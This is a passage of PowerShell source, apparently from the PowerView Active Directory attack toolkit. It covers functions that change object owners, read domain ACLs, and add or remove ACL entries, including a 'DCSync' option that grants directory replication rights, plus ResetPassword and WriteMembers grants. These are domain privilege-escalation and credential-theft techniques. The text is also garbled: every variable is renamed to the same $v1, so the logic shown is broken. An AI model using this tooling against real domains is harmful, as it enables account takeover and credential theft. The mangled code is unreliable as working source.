                        Write-Verbose "[Set-DomainObject] XORing '$v1' with '$v1' for object '$($v1.Properties.samaccountname)'"
                        $v1 = $v1.$v1[0].GetType().name


                        $v1 = $($v1.$v1) -bxor $v1
                        $v1.$v1 = $v1 -as $v1
                    }
                    $v1.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error XOR'ing properties for object '$($v1.Properties.samaccountname)' : $v1"
                }
            }
            if($v1['Clear']) {
                try {
                    $v1['Clear'] | ForEach-Object {
                        $v1 = $v1
                        Write-Verbose "[Set-DomainObject] Clearing '$v1' for object '$($v1.Properties.samaccountname)'"
                        $v1.$v1.clear()
                    }
                    $v1.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error clearing properties for object '$($v1.Properties.samaccountname)' : $v1"
                }
            }
        }
    }
}


function ConvertFrom-LDAPLogonHours {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonHours')]
    [CmdletBinding()]
    Param (
        [Parameter( ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        $v1
    )

    Begin {
        if($v1.Count -ne 21) {
            throw "LogonHoursArray is the incorrect length"
        }

        function ConvertTo-LogonHoursArray {
            Param (
                [int[]]
                $v1
            )

            $v1 = New-Object bool[] 24
            for($v1=0; $v1 -lt 3; $v1++) {
                $v1 = $v1[$v1]
                $v1 = $v1 * 8
                $v1 = [Convert]::ToString($v1,2).PadLeft(8,'0')

                $v1[$v1+0] = [bool] [convert]::ToInt32([string]$v1[7])
                $v1[$v1+1] = [bool] [convert]::ToInt32([string]$v1[6])
                $v1[$v1+2] = [bool] [convert]::ToInt32([string]$v1[5])
                $v1[$v1+3] = [bool] [convert]::ToInt32([string]$v1[4])
                $v1[$v1+4] = [bool] [convert]::ToInt32([string]$v1[3])
                $v1[$v1+5] = [bool] [convert]::ToInt32([string]$v1[2])
                $v1[$v1+6] = [bool] [convert]::ToInt32([string]$v1[1])
                $v1[$v1+7] = [bool] [convert]::ToInt32([string]$v1[0])
            }

            $v1
        }
    }

    Process {
        $v1 = @{
            Sunday = ConvertTo-LogonHoursArray -HoursArr $v1[0..2]
            Monday = ConvertTo-LogonHoursArray -HoursArr $v1[3..5]
            Tuesday = ConvertTo-LogonHoursArray -HoursArr $v1[6..8]
            Wednesday = ConvertTo-LogonHoursArray -HoursArr $v1[9..11]
            Thurs = ConvertTo-LogonHoursArray -HoursArr $v1[12..14]
            Friday = ConvertTo-LogonHoursArray -HoursArr $v1[15..17]
            Saturday = ConvertTo-LogonHoursArray -HoursArr $v1[18..20]
        }

        $v1 = New-Object PSObject -Property $v1
        $v1.PSObject.TypeNames.Insert(0, 'PowerView.LogonHours')
        $v1
    }
}


function New-ADObjectAccessControlEntry {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Security.AccessControl.AuthorizationRule')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1, Mandatory = $v1)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $v1)]
        [ValidateSet('AccessSystemSecurity', 'CreateChild','Delete','DeleteChild','DeleteTree','ExtendedRight','GenericAll','GenericExecute','GenericRead','GenericWrite','ListChildren','ListObject','ReadControl','ReadProperty','Self','Synchronize','WriteDacl','WriteOwner','WriteProperty')]
        $v1,

        [Parameter(Mandatory = $v1, ParameterSetName='AccessRuleType')]
        [ValidateSet('Allow', 'Deny')]
        [String[]]
        $v1,

        [Parameter(Mandatory = $v1, ParameterSetName='AuditRuleType')]
        [ValidateSet('Success', 'Failure')]
        [String]
        $v1,

        [Parameter(Mandatory = $v1, ParameterSetName='AccessRuleType')]
        [Parameter(Mandatory = $v1, ParameterSetName='AuditRuleType')]
        [Parameter(Mandatory = $v1, ParameterSetName='ObjectGuidLookup')]
        [Guid]
        $v1,

        [ValidateSet('All', 'Children','Descendents','None','SelfAndChildren')]
        [String]
        $v1,

        [Guid]
        $v1
    )

    Begin {
        if ($v1 -notmatch '^S-1-.*') {
            $v1 = @{
                'Identity' = $v1
                'Properties' = 'distinguishedname,objectsid'
            }
            if ($v1['PrincipalDomain']) { $v1['Domain'] = $v1 }
            if ($v1['Server']) { $v1['Server'] = $v1 }
            if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
            if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
            if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
            if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
            if ($v1['Credential']) { $v1['Credential'] = $v1 }
            $v1 = Get-DomainObject @PrincipalSearcherArguments
            if (-not $v1) {
                throw "Unable to resolve principal: $v1"
            }
            elseif($v1.Count -gt 1) {
                throw "PrincipalIdentity matches multiple AD objects, but only one is allowed"
            }
            $v1 = $v1.objectsid
        }
        else {
            $v1 = $v1
        }

        $v1 = 0
        foreach($v1 in $v1) {
            $v1 = $v1 -bor (([System.DirectoryServices.ActiveDirectoryRights]$v1).value__)
        }
        $v1 = [System.DirectoryServices.ActiveDirectoryRights]$v1

        $v1 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$v1)
    }

    Process {
        if($v1.ParameterSetName -eq 'AuditRuleType') {

            if($v1 -eq $v1 -and $v1 -eq [String]::Empty -and $v1 -eq $v1) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $v1, $v1, $v1
            } elseif($v1 -eq $v1 -and $v1 -ne [String]::Empty -and $v1 -eq $v1) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $v1, $v1, $v1, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$v1)
            } elseif($v1 -eq $v1 -and $v1 -ne [String]::Empty -and $v1 -ne $v1) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $v1, $v1, $v1, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$v1), $v1
            } elseif($v1 -ne $v1 -and $v1 -eq [String]::Empty -and $v1 -eq $v1) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $v1, $v1, $v1, $v1
            } elseif($v1 -ne $v1 -and $v1 -ne [String]::Empty -and $v1 -eq $v1) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $v1, $v1, $v1, $v1, $v1
            } elseif($v1 -ne $v1 -and $v1 -ne [String]::Empty -and $v1 -ne $v1) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $v1, $v1, $v1, $v1, $v1, $v1
            }

        }
        else {

            if($v1 -eq $v1 -and $v1 -eq [String]::Empty -and $v1 -eq $v1) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $v1, $v1, $v1
            } elseif($v1 -eq $v1 -and $v1 -ne [String]::Empty -and $v1 -eq $v1) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $v1, $v1, $v1, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$v1)
            } elseif($v1 -eq $v1 -and $v1 -ne [String]::Empty -and $v1 -ne $v1) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $v1, $v1, $v1, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$v1), $v1
            } elseif($v1 -ne $v1 -and $v1 -eq [String]::Empty -and $v1 -eq $v1) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $v1, $v1, $v1, $v1
            } elseif($v1 -ne $v1 -and $v1 -ne [String]::Empty -and $v1 -eq $v1) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $v1, $v1, $v1, $v1, $v1
            } elseif($v1 -ne $v1 -and $v1 -ne [String]::Empty -and $v1 -ne $v1) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $v1, $v1, $v1, $v1, $v1, $v1
            }

        }
    }
}


function Set-DomainObjectOwner {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $v1, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $v1,

        [Parameter(Mandatory = $v1)]
        [ValidateNotNullOrEmpty()]
        [Alias('Owner')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $v1 = @{}
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['LDAPFilter']) { $v1['LDAPFilter'] = $v1 }
        if ($v1['SearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }

        $v1 = Get-DomainObject @SearcherArguments -Identity $v1 -Properties objectsid | Select-Object -ExpandProperty objectsid
        if ($v1) {
            $v1 = [System.Security.Principal.SecurityIdentifier]$v1
        }
        else {
            Write-Warning "[Set-DomainObjectOwner] Error parsing owner identity '$v1'"
        }
    }

    PROCESS {
        if ($v1) {
            $v1['Raw'] = $v1
            $v1['Identity'] = $v1


            $v1 = Get-DomainObject @SearcherArguments

            ForEach ($v1 in $v1) {
                try {
                    Write-Verbose "[Set-DomainObjectOwner] Attempting to set the owner for '$v1' to '$v1'"
                    $v1 = $v1.GetDirectoryEntry()
                    $v1.PsBase.Options.SecurityMasks = 'Owner'
                    $v1.PsBase.ObjectSecurity.SetOwner($v1)
                    $v1.PsBase.CommitChanges()
                }
                catch {
                    Write-Warning "[Set-DomainObjectOwner] Error setting owner: $v1"
                }
            }
        }
    }
}


function Get-DomainObjectAcl {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $v1,

        [Switch]
        $v1,

        [Switch]
        $v1,

        [String]
        [Alias('Rights')]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $v1 = @{
            'Properties' = 'samaccountname,ntsecuritydescriptor,distinguishedname,objectsid'
        }

        if ($v1['Sacl']) {
            $v1['SecurityMasks'] = 'Sacl'
        }
        else {
            $v1['SecurityMasks'] = 'Dacl'
        }
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['SearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }
        $v1 = Get-DomainSearcher @SearcherArguments

        $v1 = @{}
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }


        if ($v1['ResolveGUIDs']) {
            $v1 = Get-DomainGUIDMap @DomainGUIDMapArguments
        }
    }

    PROCESS {
        if ($v1) {
            $v1 = ''
            $v1 = ''
            $v1 | Where-Object {$v1} | ForEach-Object {
                $v1 = $v1.Replace('(', '\28').Replace(')', '\29')
                if ($v1 -match '^S-1-.*') {
                    $v1 += "(objectsid=$v1)"
                }
                elseif ($v1 -match '^(CN|OU|DC)=.*') {
                    $v1 += "(distinguishedname=$v1)"
                    if ((-not $v1['Domain']) -and (-not $v1['SearchBase'])) {


                        $v1 = $v1.SubString($v1.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainObjectAcl] Extracted domain '$v1' from '$v1'"
                        $v1['Domain'] = $v1
                        $v1 = Get-DomainSearcher @SearcherArguments
                        if (-not $v1) {
                            Write-Warning "[Get-DomainObjectAcl] Unable to retrieve domain searcher for '$v1'"
                        }
                    }
                }
                elseif ($v1 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $v1 = (([Guid]$v1).ToByteArray() | ForEach-Object { '\' + $v1.ToString('X2') }) -join ''
                    $v1 += "(objectguid=$v1)"
                }
                elseif ($v1.Contains('.')) {
                    $v1 += "(|(samAccountName=$v1)(name=$v1)(dnshostname=$v1))"
                }
                else {
                    $v1 += "(|(samAccountName=$v1)(name=$v1)(displayname=$v1))"
                }
            }
            if ($v1 -and ($v1.Trim() -ne '') ) {
                $v1 += "(|$v1)"
            }

            if ($v1['LDAPFilter']) {
                Write-Verbose "[Get-DomainObjectAcl] Using additional LDAP filter: $v1"
                $v1 += "$v1"
            }

            if ($v1) {
                $v1.filter = "(&$v1)"
            }
            Write-Verbose "[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: $($v1.filter)"

            $v1 = $v1.FindAll()
            $v1 | Where-Object {$v1} | ForEach-Object {
                $v1 = $v1.Properties

                if ($v1.objectsid -and $v1.objectsid[0]) {
                    $v1 = (New-Object System.Security.Principal.SecurityIdentifier($v1.objectsid[0],0)).Value
                }
                else {
                    $v1 = $v1
                }

                try {
                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $v1['ntsecuritydescriptor'][0], 0 | ForEach-Object { if ($v1['Sacl']) {$v1.SystemAcl} else {$v1.DiscretionaryAcl} } | ForEach-Object {
                        if ($v1['RightsFilter']) {
                            $v1 = Switch ($v1) {
                                'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                                'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                                Default { '00000000-0000-0000-0000-000000000000' }
                            }
                            if ($v1.ObjectType -eq $v1) {
                                $v1 | Add-Member NoteProperty 'ObjectDN' $v1.distinguishedname[0]
                                $v1 | Add-Member NoteProperty 'ObjectSID' $v1
                                $v1 = $v1
                            }
                        }
                        else {
                            $v1 | Add-Member NoteProperty 'ObjectDN' $v1.distinguishedname[0]
                            $v1 | Add-Member NoteProperty 'ObjectSID' $v1
                            $v1 = $v1
                        }

                        if ($v1) {
                            $v1 | Add-Member NoteProperty 'ActiveDirectoryRights' ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $v1.AccessMask))
                            if ($v1) {

                                $v1 = @{}
                                $v1.psobject.properties | ForEach-Object {
                                    if ($v1.Name -match 'ObjectType|InheritedObjectType|ObjectAceType|InheritedObjectAceType') {
                                        try {
                                            $v1[$v1.Name] = $v1[$v1.Value.toString()]
                                        }
                                        catch {
                                            $v1[$v1.Name] = $v1.Value
                                        }
                                    }
                                    else {
                                        $v1[$v1.Name] = $v1.Value
                                    }
                                }
                                $v1 = New-Object -TypeName PSObject -Property $v1
                                $v1.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $v1
                            }
                            else {
                                $v1.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $v1
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose "[Get-DomainObjectAcl] Error: $v1"
                }
            }
        }
    }
}


function Add-DomainObjectAcl {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [Parameter(Mandatory = $v1)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $v1 = 'All',

        [Guid]
        $v1
    )

    BEGIN {
        $v1 = @{
            'Properties' = 'distinguishedname'
            'Raw' = $v1
        }
        if ($v1['TargetDomain']) { $v1['Domain'] = $v1 }
        if ($v1['TargetLDAPFilter']) { $v1['LDAPFilter'] = $v1 }
        if ($v1['TargetSearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }

        $v1 = @{
            'Identity' = $v1
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($v1['PrincipalDomain']) { $v1['Domain'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }
        $v1 = Get-DomainObject @PrincipalSearcherArguments
        if (-not $v1) {
            throw "Unable to resolve principal: $v1"
        }
    }

    PROCESS {
        $v1['Identity'] = $v1
        $v1 = Get-DomainObject @TargetSearcherArguments

        ForEach ($v1 in $v1) {

            $v1 = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $v1 = [System.Security.AccessControl.AccessControlType] 'Allow'
            $v1 = @()

            if ($v1) {
                $v1 = @($v1)
            }
            else {
                $v1 = Switch ($v1) {

                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }

                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }




                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }

            ForEach ($v1 in $v1) {
                Write-Verbose "[Add-DomainObjectAcl] Granting principal $($v1.distinguishedname) '$v1' on $($v1.Properties.distinguishedname)"

                try {
                    $v1 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$v1.objectsid)

                    if ($v1) {
                        ForEach ($v1 in $v1) {
                            $v1 = New-Object Guid $v1
                            $v1 = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $v1 += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $v1, $v1, $v1, $v1, $v1
                        }
                    }
                    else {

                        $v1 = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $v1 += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $v1, $v1, $v1, $v1
                    }


                    ForEach ($v1 in $v1) {
                        Write-Verbose "[Add-DomainObjectAcl] Granting principal $($v1.distinguishedname) rights GUID '$($v1.ObjectType)' on $($v1.Properties.distinguishedname)"
                        $v1 = $v1.GetDirectoryEntry()
                        $v1.PsBase.Options.SecurityMasks = 'Dacl'
                        $v1.PsBase.ObjectSecurity.AddAccessRule($v1)
                        $v1.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[Add-DomainObjectAcl] Error granting principal $($v1.distinguishedname) '$v1' on $($v1.Properties.distinguishedname) : $v1"
                }
            }
        }
    }
}


function Remove-DomainObjectAcl {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [Parameter(Mandatory = $v1)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $v1 = 'All',

        [Guid]
        $v1
    )

    BEGIN {
        $v1 = @{
            'Properties' = 'distinguishedname'
            'Raw' = $v1
        }
        if ($v1['TargetDomain']) { $v1['Domain'] = $v1 }
        if ($v1['TargetLDAPFilter']) { $v1['LDAPFilter'] = $v1 }
        if ($v1['TargetSearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }

        $v1 = @{
            'Identity' = $v1
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($v1['PrincipalDomain']) { $v1['Domain'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }
        $v1 = Get-DomainObject @PrincipalSearcherArguments
        if (-not $v1) {
            throw "Unable to resolve principal: $v1"
        }
    }

    PROCESS {
        $v1['Identity'] = $v1
        $v1 = Get-DomainObject @TargetSearcherArguments

        ForEach ($v1 in $v1) {

            $v1 = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $v1 = [System.Security.AccessControl.AccessControlType] 'Allow'
            $v1 = @()

            if ($v1) {
                $v1 = @($v1)
            }
            else {
                $v1 = Switch ($v1) {

                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }

                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }




                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }

            ForEach ($v1 in $v1) {
                Write-Verbose "[Remove-DomainObjectAcl] Removing principal $($v1.distinguishedname) '$v1' from $($v1.Properties.distinguishedname)"

                try {
                    $v1 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$v1.objectsid)

                    if ($v1) {
                        ForEach ($v1 in $v1) {
                            $v1 = New-Object Guid $v1
                            $v1 = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $v1 += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $v1, $v1, $v1, $v1, $v1
                        }
                    }
                    else {

                        $v1 = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $v1 += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $v1, $v1, $v1, $v1
                    }


                    ForEach ($v1 in $v1) {
                        Write-Verbose "[Remove-DomainObjectAcl] Granting principal $($v1.distinguishedname) rights GUID '$($v1.ObjectType)' on $($v1.Properties.distinguishedname)"
                        $v1 = $v1.GetDirectoryEntry()
                        $v1.PsBase.Options.SecurityMasks = 'Dacl'
                        $v1.PsBase.ObjectSecurity.RemoveAccessRule($v1)
                        $v1.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[Remove-DomainObjectAcl] Error removing principal $($v1.distinguishedname) '$v1' from $($v1.Properties.distinguishedname) : $v1"
                }
            }
        }
    }
}


function Find-InterestingDomainAcl {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('DomainName', 'Name')]
        [String]
        $v1,

        [Switch]
        $v1,

        [String]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $v1 = @{}
        if ($v1['ResolveGUIDs']) { $v1['ResolveGUIDs'] = $v1 }
        if ($v1['RightsFilter']) { $v1['RightsFilter'] = $v1 }
        if ($v1['LDAPFilter']) { $v1['LDAPFilter'] = $v1 }
        if ($v1['SearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }

        $v1 = @{
            'Properties' = 'samaccountname,objectclass'
            'Raw' = $v1
        }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
